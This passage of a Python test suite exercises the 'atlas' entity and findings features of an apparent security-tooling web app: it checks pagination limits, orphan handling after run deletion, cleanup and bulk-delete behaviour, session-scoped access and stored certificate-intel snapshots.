                    "VALUES (?, ?, 'atlas_entity', ?, ?, 'manual', ?)",
                    ("lbl-" + uuid.uuid4().hex, session_id, entity_id, f"label-{index}", timestamp),
                )
                conn.execute(
                    "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, 'atlas_entity', ?, ?, ?, ?)",
                    ("note-" + uuid.uuid4().hex, session_id, entity_id, f"note-{index}", timestamp, timestamp),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, 'manual', ?)",
                    ("plink-" + uuid.uuid4().hex, project_id, entity_id, timestamp),
                )
            conn.commit()

            statements = []
            conn.set_trace_callback(statements.append)
            result = list_entities(conn, session_id, limit=50)
            conn.set_trace_callback(None)

        rows = result["entities"]
        assert len(rows) == len(recorded)
        assert all(row["labels"] for row in rows)
        assert all(row["project_link_count"] == 1 for row in rows)
        assert all("note" not in row and "project_links" not in row for row in rows)
        assert sum("SELECT entity_id, id, label" in statement for statement in statements) == 1
        assert sum("SELECT entity_id, body FROM entity_notes" in statement for statement in statements) == 0
        assert sum("FROM project_links l JOIN projects" in statement for statement in statements) == 1

    def test_atlas_search_matches_entity_and_finding_metadata(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        with db_connect() as conn:
            finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()["id"]
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-label', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-note', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'finding', ?, 'metadata-finding-label', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'metadata-finding-note', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.commit()

        entity_label_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-label",
            headers={"X-Session-ID": session_id},
        )
        entity_note_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-note",
            headers={"X-Session-ID": session_id},
        )
        finding_label_resp = client.get(
            "/atlas/findings?q=metadata-finding-label",
            headers={"X-Session-ID": session_id},
        )
        finding_entity_note_resp = client.get(
            "/atlas/findings?q=metadata-domain-note",
            headers={"X-Session-ID": session_id},
        )
        miss_resp = client.get(
            "/atlas/entities?type=domain&q=metadata-domain-label",
            headers={"X-Session-ID": self._session_id()},
        )

        assert entity_label_resp.status_code == 200
        assert json.loads(entity_label_resp.data)["total"] == 1
        assert json.loads(entity_note_resp.data)["total"] == 1
        assert json.loads(finding_label_resp.data)["total"] == 1
        assert json.loads(finding_entity_note_resp.data)["total"] == 1
        assert json.loads(miss_resp.data)["total"] == 0

    def test_entity_detail_caps_large_linked_collections(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        with db_connect() as conn:
            for index in range(55):
                run_id = "run-extra-" + uuid.uuid4().hex
                finding_id = "finding-extra-" + uuid.uuid4().hex
                seen_at = f"2026-05-14T01:{index:02d}:00+00:00"
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', ?, ?, '[]', 1)",
                    (run_id, session_id, f"nmap detail {index}", seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links "
                    "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (domain_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, "
                    "tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, "
                    "status, title, raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'info', 'finding', 'nmap', ?, ?, ?, ?, 1, "
                    "'new', ?, ?, ?)",
                    (
                        finding_id,
                        session_id,
                        run_id,
                        domain_id,
                        f"detail-{index}",
                        f"sig-{uuid.uuid4().hex}",
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        f"Detail finding {index}",
                        f"detail finding line {index}",
                        seen_at,
                    ),
                )
            conn.commit()

        resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

        assert resp.status_code == 200
        detail = resp.get_json()
        assert len(detail["runs"]) == 50
        assert len(detail["findings"]) == 50
        assert detail["detail_limits"]["runs"] == {
            "limit": 50,
            "offset": 0,
            "shown": 50,
            "total": 56,
            "has_more": True,
        }
        assert detail["detail_limits"]["findings"] == {
            "limit": 50,
            "offset": 0,
            "shown": 50,
            "total": 56,
            "has_more": True,
        }

        paged_resp = client.get(
            f"/atlas/entities/{domain_id}?runs_offset=50&findings_offset=50",
            headers={"X-Session-ID": session_id},
        )
        paged_detail = paged_resp.get_json()
        assert paged_resp.status_code == 200
        assert len(paged_detail["runs"]) == 6
        assert len(paged_detail["findings"]) == 6
        assert paged_detail["detail_limits"]["runs"] == {
            "limit": 50,
            "offset": 50,
            "shown": 6,
            "total": 56,
            "has_more": False,
        }
        assert paged_detail["detail_limits"]["findings"] == {
            "limit": 50,
            "offset": 50,
            "shown": 6,
            "total": 56,
            "has_more": False,
        }

    def test_orphan_filter_surfaces_atlas_rows_after_source_run_delete(self):
        client = get_client()
        session_id = self._session_id()
        run_id, _ = self._seed_entity_run(session_id)

        delete_resp = client.delete(f"/history/{run_id}", headers={"X-Session-ID": session_id})
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        orphan_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})
        orphan_entities = client.get(
            "/atlas/entities?type=domain&orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )
        orphan_findings = client.get(
            "/atlas/findings?orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )

        assert delete_resp.status_code == 200
        assert json.loads(default_summary.data)["counts"]["domain"] == 0
        assert json.loads(default_summary.data)["findings"] == 0
        assert json.loads(orphan_summary.data)["counts"]["domain"] == 1
        assert json.loads(orphan_summary.data)["findings"] == 1
        assert json.loads(orphan_entities.data)["total"] == 1
        assert json.loads(orphan_findings.data)["total"] == 1

    def test_stale_run_links_do_not_hide_atlas_orphans_or_block_cleanup(self):
        client = get_client()
        session_id = self._session_id()
        live_run_id, _ = self._seed_entity_run(session_id)
        stale_run_id, _ = self._seed_entity_run(session_id)
        with db_connect() as conn:
            conn.execute("DELETE FROM runs WHERE id = ?", (stale_run_id,))
            conn.commit()

        preview_resp = client.get(
            f"/history/{live_run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        orphan_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["entities"] == 2
        assert preview["findings"] == 1
        assert json.loads(default_summary.data)["counts"]["domain"] == 1
        assert json.loads(default_summary.data)["findings"] == 1
        assert json.loads(orphan_summary.data)["counts"]["domain"] == 0
        assert json.loads(orphan_summary.data)["findings"] == 0
        delete_resp = client.delete(f"/history/{live_run_id}", headers={"X-Session-ID": session_id})
        orphan_only_summary = client.get("/atlas?orphan_filter=only", headers={"X-Session-ID": session_id})
        orphan_entities = client.get(
            "/atlas/entities?type=domain&orphan_filter=only",
            headers={"X-Session-ID": session_id},
        )

        assert delete_resp.status_code == 200
        assert json.loads(client.get("/atlas", headers={"X-Session-ID": session_id}).data)["counts"]["domain"] == 0
        assert json.loads(orphan_only_summary.data)["counts"]["domain"] == 1
        assert json.loads(orphan_only_summary.data)["findings"] == 1
        orphan_data = json.loads(orphan_entities.data)
        assert orphan_data["total"] == 1
        assert orphan_data["entities"][0]["run_count"] == 0

    def test_run_delete_can_prune_non_curated_atlas_orphans_and_keep_curated_entities(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'kept', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, cve_id),
            )
            conn.commit()

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["entities"] == 1
        assert preview["findings"] == 1
        assert preview["curated_entities"] == 1
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
                (session_id,),
            ).fetchall()
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]
        assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
        assert finding_count == 0

    def test_run_cleanup_protects_findings_reachable_through_project_run_links(self):
        client = get_client()
        session_id = self._session_id()
        run_id, _ = self._seed_entity_run(session_id)
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Cleanup Project"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        default_delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 200
        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["findings"] == 0
        assert preview["curated_findings"] == 1
        assert default_delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ? AND type = 'domain'",
                (session_id,),
            ).fetchone()[0] == 1

    def test_run_delete_can_prune_curated_project_reachable_atlas_rows_when_requested(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Curated Cleanup Project"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )

        preview_resp = client.get(
            f"/history/{run_id}/atlas-cleanup-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/history/{run_id}?prune_atlas=1&prune_curated_atlas=1",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["cleanup"]
        assert preview["findings"] == 0
        assert preview["curated_entities"] == 1
        assert preview["curated_findings"] == 1
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0

    def test_delete_atlas_finding_can_cleanup_same_run_siblings(self):
        client = get_client()
        session_id = self._session_id()
        self._seed_entity_run(session_id)
        list_resp = client.get("/atlas/findings", headers={"X-Session-ID": session_id})
        finding_id = json.loads(list_resp.data)["findings"][0]["id"]

        preview_resp = client.get(
            f"/atlas/findings/{finding_id}/delete-preview",
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(
            f"/atlas/findings/{finding_id}",
            json={"prune_source_run": True},
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["preview"]
        assert preview["sibling_cleanup"]["entities"] == 2
        assert delete_resp.status_code == 200
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0] == 0

    def test_run_retaining_atlas_cleanup_detaches_sources_and_recalculates_rows(self):
        client = get_client()
        session_id = self._session_id()
        first_run_id, recorded = self._seed_entity_run(session_id)
        second_run_id, _ = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")

        first_cleanup_resp = client.post(
            f"/atlas/runs/{first_run_id}/cleanup",
            headers={"X-Session-ID": session_id},
        )
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
        second_cleanup_resp = client.post(
            f"/atlas/runs/{second_run_id}/cleanup",
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get("/atlas", headers={"X-Session-ID": session_id})

        assert first_cleanup_resp.status_code == 200
        first_cleanup = json.loads(first_cleanup_resp.data)["cleanup"]
        assert first_cleanup["deleted_entities"] == 0
        assert first_cleanup["deleted_findings"] == 0
        assert first_cleanup["detached_entities"] == 2
        assert first_cleanup["detached_findings"] == 1
        detail = json.loads(detail_resp.data)
        assert detail["entity"]["occurrence_count"] == 1
        assert [run["run_id"] for run in detail["runs"]] == [second_run_id]
        assert detail["findings"][0]["occurrence_count"] == 1
        assert second_cleanup_resp.status_code == 200
        assert json.loads(second_cleanup_resp.data)["cleanup"]["deleted_entities"] == 2
        assert json.loads(summary_resp.data)["total"] == 0
        assert json.loads(summary_resp.data)["findings"] == 0
        with db_connect() as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM runs WHERE session_id = ? AND id IN (?, ?)",
                (session_id, first_run_id, second_run_id),
            ).fetchone()[0] == 2

    def test_bulk_delete_atlas_entities_and_findings(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        finding_session_id = self._session_id()
        self._seed_entity_run(finding_session_id)
        list_resp = client.get("/atlas/findings", headers={"X-Session-ID": finding_session_id})
        finding_id = json.loads(list_resp.data)["findings"][0]["id"]

        entity_resp = client.post(
            "/atlas/entities/bulk-delete",
            json={"entity_ids": [domain_id, "missing-entity"]},
            headers={"X-Session-ID": session_id},
        )
        finding_resp = client.post(
            "/atlas/findings/bulk-delete",
            json={"finding_ids": [finding_id, "missing-finding"]},
            headers={"X-Session-ID": finding_session_id},
        )

        assert entity_resp.status_code == 200
        entity_data = json.loads(entity_resp.data)
        assert entity_data["counts"] == {"deleted": 1, "findings_deleted": 1, "not_found": 1}
        assert entity_data["results"] == [
            {"entity_id": domain_id, "status": "deleted"},
            {"entity_id": "missing-entity", "status": "not_found"},
        ]
        assert finding_resp.status_code == 200
        finding_data = json.loads(finding_resp.data)
        assert finding_data["counts"] == {"deleted": 1, "not_found": 1}
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
                (session_id,),
            ).fetchall()
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]
        assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
        assert cve_id
        assert finding_count == 0
        entity_delete_events = [
            row for row in _audit_event_rows(event_type="entity.delete")
            if domain_id in row["details"].get("entity_ids", [])
        ]
        assert len(entity_delete_events) == 1
        assert entity_delete_events[0]["target_type"] == "entity"
        assert entity_delete_events[0]["details"]["deleted_count"] == 1
        assert entity_delete_events[0]["details"]["finding_count"] == 1

    def test_atlas_read_and_write_routes_are_session_scoped(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        wrong_session_id = self._session_id()
        project_resp = client.post(
            "/projects",
            json={"name": "Scoped Atlas Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        owner_link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ? AND entity_id = ?",
                (session_id, domain_id),
            ).fetchone()["id"]
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    domain_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["crtsh"]}}),
                ),
            )
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'curated', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep this context', datetime('now'), datetime('now'))",
                ("note-" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.commit()

        def owner_state():
            with db_connect() as conn:
                return {
                    "entities": [
                        tuple(row) for row in conn.execute(
                            "SELECT id, type, canonical_value, occurrence_count FROM entities "
                            "WHERE session_id = ? ORDER BY id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "findings": [
                        tuple(row) for row in conn.execute(
                            "SELECT id, status, raw_line FROM findings WHERE session_id = ? ORDER BY id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "snapshots": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, provider, status, summary, data_json FROM entity_intel_snapshots "
                            "WHERE session_id = ? ORDER BY entity_id, provider",
                            (session_id,),
                        ).fetchall()
                    ],
                    "labels": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, label FROM entity_labels WHERE session_id = ? ORDER BY entity_id, label",
                            (session_id,),
                        ).fetchall()
                    ],
                    "notes": [
                        tuple(row) for row in conn.execute(
                            "SELECT entity_id, body FROM entity_notes WHERE session_id = ? ORDER BY entity_id",
                            (session_id,),
                        ).fetchall()
                    ],
                    "links": [
                        tuple(row) for row in conn.execute(
                            "SELECT project_id, entity_type, entity_id FROM project_links "
                            "WHERE project_id = ? ORDER BY entity_type, entity_id",
                            (project["id"],),
                        ).fetchall()
                    ],
                }

        before = owner_state()

        with mock.patch("services.atlas.intel_bridge.lookup_entity", side_effect=AssertionError("cross-session lookup")):
            detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": wrong_session_id})
            review_resp = client.post(
                "/atlas/findings/review",
                json={"finding_ids": [finding_id], "review_state": "important"},
                headers={"X-Session-ID": wrong_session_id},
            )
            bulk_entity_resp = client.post(
                "/atlas/entities/bulk-delete",
                json={"entity_ids": [domain_id]},
                headers={"X-Session-ID": wrong_session_id},
            )
            entity_delete_resp = client.delete(
                f"/atlas/entities/{domain_id}",
                json={"prune_source_run": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            bulk_finding_resp = client.post(
                "/atlas/findings/bulk-delete",
                json={"finding_ids": [finding_id]},
                headers={"X-Session-ID": wrong_session_id},
            )
            finding_suppression_resp = client.put(
                f"/atlas/findings/{finding_id}/suppression",
                json={"suppressed": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            entity_suppression_resp = client.put(
                f"/atlas/entities/{domain_id}/suppression",
                json={"suppressed": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            finding_delete_resp = client.delete(
                f"/atlas/findings/{finding_id}",
                json={"prune_source_run": True},
                headers={"X-Session-ID": wrong_session_id},
            )
            refresh_resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": wrong_session_id},
            )
            link_resp = client.post(
                f"/atlas/entities/{domain_id}/project_links",
                json={"project_id": project["id"]},
                headers={"X-Session-ID": wrong_session_id},
            )
            unlink_resp = client.delete(
                f"/atlas/entities/{domain_id}/project_links/{project['id']}",
                headers={"X-Session-ID": wrong_session_id},
            )

        assert owner_link_resp.status_code == 201
        assert detail_resp.status_code == 404
        assert review_resp.status_code == 200
        assert json.loads(review_resp.data)["counts"] == {"updated": 0, "not_found": 1}
        assert bulk_entity_resp.status_code == 200
        assert json.loads(bulk_entity_resp.data)["counts"] == {"deleted": 0, "findings_deleted": 0, "not_found": 1}
        assert entity_delete_resp.status_code == 404
        assert bulk_finding_resp.status_code == 200
        assert json.loads(bulk_finding_resp.data)["counts"] == {"deleted": 0, "not_found": 1}
        assert finding_suppression_resp.status_code == 404
        assert entity_suppression_resp.status_code == 404
        assert finding_delete_resp.status_code == 404
        assert refresh_resp.status_code == 404
        assert link_resp.status_code == 404
        assert unlink_resp.status_code == 404
        assert owner_state() == before

    def test_refresh_intel_persists_provider_snapshot(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        provider_result = mock.Mock(
            provider="crtsh",
            status="ok",
            message="",
            result=mock.Mock(
                provider="crtsh",
                payload={
                    "providers": {
                        "crtsh": {
                            "certificate_count": 3,
                            "names": ["darklab.sh", "www.darklab.sh"],
                            "last_seen": "2026-05-14T00:00:00Z",
                        },
                    },
                    "summary": {"has_intel": True, "providers_with_data": ["crtsh"]},
                },
            ),
        )
        lookup_result = mock.Mock(
            entity_type="domain",
            canonical_value="darklab.sh",
            providers=[provider_result],
            success_count=1,
            configured_count=1,
        )

        with mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
            resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": session_id},
            )

        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["refresh"]["success_count"] == 1
        with db_connect() as conn:
            row = conn.execute(
                "SELECT provider, status, summary, data_json FROM entity_intel_snapshots "
                "WHERE session_id = ? AND entity_id = ?",
                (session_id, domain_id),
            ).fetchone()
        assert row["provider"] == "crtsh"
        assert row["status"] == "ok"
        assert row["summary"] == "data available"
        assert json.loads(row["data_json"])["summary"]["has_intel"] is True
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
        detail = json.loads(detail_resp.data)
        assert detail["intel_summary"]["status"] == "available"
        assert detail["intel_summary"]["providers_with_data"] == ["crtsh"]
        assert {
            (item["label"], item["value"], item["provider"])
            for item in detail["intel_summary"]["highlights"]
        } >= {
            ("Certificates", "3", "crtsh"),
            ("Names", "darklab.sh, www.darklab.sh", "crtsh"),
        }

    def test_refresh_intel_can_offload_provider_payload_and_restore_detail(self):
        from services.storage import body_store

        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        provider_result = mock.Mock(
            provider="crtsh",
            status="ok",
            message="",
            result=mock.Mock(
                provider="crtsh",
                payload={
                    "providers": {"crtsh": {"certificate_count": 7}},
                    "summary": {"has_intel": True, "providers_with_data": ["crtsh"]},
                },
            ),
        )
        lookup_result = mock.Mock(
            entity_type="domain",
            canonical_value="darklab.sh",
            providers=[provider_result],
            success_count=1,
            configured_count=1,
        )

        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"intel_payload_inline_max_bytes": 1}), \
             mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
            refresh_resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": session_id},
            )
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT data_json FROM entity_intel_snapshots WHERE session_id = ? AND entity_id = ?",
                    (session_id, domain_id),
                ).fetchone()["data_json"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
            delete_resp = client.delete(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

            assert refresh_resp.status_code == 200
            assert detail_resp.status_code == 200
            detail = json.loads(detail_resp.data)
            assert detail["intel_snapshots"][0]["data"]["providers"]["crtsh"]["certificate_count"] == 7
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_findings_tab_lists_and_bulk_updates_review_state(self):
        client = get_client()
        session_id = self._session_id()
        self._seed_entity_run(session_id)

        list_resp = client.get("/atlas/findings?review_state=new", headers={"X-Session-ID": session_id})
        data = json.loads(list_resp.data)
        finding_id = data["findings"][0]["id"]
        wrong_session_id = self._session_id()
        bulk_resp = client.post(
            "/atlas/findings/review",
            json={"finding_ids": [finding_id, "missing-finding"], "review_state": "important"},
            headers={"X-Session-ID": session_id},
        )
        missing_triage_get_resp = client.get(
            "/findings/missing-finding/triage",
            headers={"X-Session-ID": session_id},
        )
        missing_triage_put_resp = client.put(
            "/findings/missing-finding/triage",
            json={"verification_status": "ready_to_verify"},
            headers={"X-Session-ID": session_id},
        )
        cross_scope_triage_get_resp = client.get(
            f"/findings/{finding_id}/triage",
            headers={"X-Session-ID": wrong_session_id},
        )
        cross_scope_triage_put_resp = client.put(
            f"/findings/{finding_id}/triage",
            json={"verification_status": "ready_to_verify"},
            headers={"X-Session-ID": wrong_session_id},
        )
        triage_get_empty_resp = client.get(
            f"/findings/{finding_id}/triage",
            headers={"X-Session-ID": session_id},
        )
        with mock.patch("blueprints.projects.log.debug") as triage_debug, \
             mock.patch("blueprints.projects.log.info") as triage_info:
            triage_update_resp = client.put(
                f"/findings/{finding_id}/triage",
                json={
                    "remediation": "Patch the exposed service.",
                    "verification_steps": "Re-run the original check.",
                    "verification_status": "ready_to_verify",
                    "verification_notes": "Coordinate with the service owner.",
                },
                headers={"X-Session-ID": session_id},
            )
        with mock.patch("blueprints.projects.upsert_finding_triage_details", return_value=None), \
             mock.patch("blueprints.projects.log.warning") as triage_miss_warning:
            triage_update_miss_resp = client.put(
                f"/findings/{finding_id}/triage",
                json={"verification_status": "verified"},
                headers={"X-Session-ID": session_id},
            )
        triage_invalid_resp = client.put(
            f"/findings/{finding_id}/triage",
            json={"verification_status": "done"},
            headers={"X-Session-ID": session_id},
        )
        triage_oversized_resp = client.put(
            f"/findings/{finding_id}/triage",
            json={"remediation": "x" * 20001},
            headers={"X-Session-ID": session_id},
        )
        triage_null_resp = client.put(
            f"/findings/{finding_id}/triage",
            data="null",
            content_type="application/json",
            headers={"X-Session-ID": session_id},
        )
        with mock.patch("blueprints.projects.log.warning") as malformed_warning:
            triage_malformed_resp = client.put(
                f"/findings/{finding_id}/triage",
                data="{",
                content_type="application/json",
                headers={"X-Session-ID": session_id},
            )
        triage_empty_body_resp = client.put(
            f"/findings/{finding_id}/triage",
            data="",
            content_type="application/json",
            headers={"X-Session-ID": session_id},
        )
        triage_after_bad_payloads_resp = client.get(
            f"/findings/{finding_id}/triage",
            headers={"X-Session-ID": session_id},
        )
        self._seed_domain_finding_run(session_id, "no-triage.darklab.test")
        self._seed_domain_finding_run(session_id, "explicit-not-started.darklab.test")
        with db_connect() as conn:
            no_triage_finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ? AND raw_line LIKE ?",
                (session_id, "%no-triage.darklab.test%"),
            ).fetchone()["id"]
            explicit_not_started_finding_id = conn.execute(
                "SELECT id FROM findings WHERE session_id = ? AND raw_line LIKE ?",
                (session_id, "%explicit-not-started.darklab.test%"),
            ).fetchone()["id"]
        explicit_not_started_resp = client.put(
            f"/findings/{explicit_not_started_finding_id}/triage",
            json={
                "remediation": "Keep this queued for later verification.",
                "verification_status": "not_started",
            },
            headers={"X-Session-ID": session_id},
        )
        filtered_resp = client.get(
            "/atlas/findings?verification_status=ready_to_verify",
            headers={"X-Session-ID": session_id},
        )
        filtered_not_started_resp = client.get(
            "/atlas/findings?verification_status=not_started",
            headers={"X-Session-ID": session_id},
        )
        filtered_empty_resp = client.get(
            "/atlas/findings?verification_status=verified",
            headers={"X-Session-ID": session_id},
        )
        filtered_invalid_resp = client.get(
            "/atlas/findings?verification_status=done",
            headers={"X-Session-ID": session_id},
        )

        assert list_resp.status_code == 200
        assert data["total"] == 1
        assert data["findings"][0]["entity_value"] == "darklab.sh"
        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {"updated": 1, "not_found": 1}
